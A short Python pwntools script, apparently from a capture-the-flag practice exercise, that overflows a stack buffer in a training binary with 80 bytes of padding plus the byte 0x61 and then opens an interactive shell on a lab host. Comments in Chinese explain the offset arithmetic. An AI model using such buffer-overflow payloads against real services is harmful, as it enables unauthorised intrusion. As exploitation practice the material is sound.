'''
Author: 白银
Date: 2022-11-14 20:13:03
LastEditTime: 2022-11-15 19:42:22
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?t=133.4  远程打不起来
'''
from pwn import *

context(log_level='debug', arch='arm64', os='linux')

pwnfile = './question_1_x64_var'
state = 0

if state == 0:
    io = remote("192.168.61.134", 8888)
else:
    io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 80  # rbp - 0x20 = 0x7fffffffdc00 - 0x20 = 0x7fffffffdbe0 → 0x7fffffffdbe0 - 0x7fffffffdb90(cyclic输入的100个字符的开始地址) = 0x50 → 转十进制
payloadtext = 0x61  # cmp    al, 0x61
payload = padding * b'a' + p64(payloadtext)

dem = b'input:\n'
io.sendlineafter(dem, payload)

io.interactive()  # 交互shell
